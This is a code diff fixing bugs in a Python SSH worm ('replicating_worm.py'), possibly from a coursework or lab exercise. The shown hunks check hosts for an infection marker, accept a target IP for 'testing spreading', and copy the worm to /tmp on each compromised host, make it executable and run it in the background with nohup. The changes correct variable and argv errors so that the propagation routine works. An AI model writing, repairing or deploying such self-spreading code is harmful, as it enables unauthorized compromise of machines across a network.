@@ -53,7 +53,7 @@ def isTargetInfected(ssh):
 		sftpClient = ssh.open_sftp()
 		     
 		# Check if the file exists
-		sftpClient.stat(infectionMarker)
+		sftpClient.stat(markerLocation)
 	 
 		# The system is already infected
 		infected = True
@@ -130,9 +130,9 @@ if len(sys.argv) >= 2:
 		print("This is the host computer will change where worm is copied from")
 		wormLocation = "replicating_worm.py"
 	elif sys.argv[1] == "-t":
-		print("Testing spreading with this IP: %s" %(str(argv[2])))
+		print("Testing spreading with this IP: %s" %(str(sys.argv[2])))
 		wormLocation = "replicating_worm.py"
-		network = [argv[2]]
+		network = [sys.argv[2]]
 
 
 for Host in network:		
@@ -151,7 +151,7 @@ for Host in network:
 				sftpClient = sshInfo[0].open_sftp()
 				sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
 				sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
-				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py & > log.txt")
+				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
 			except:
 				print ("Something went wrong")
 
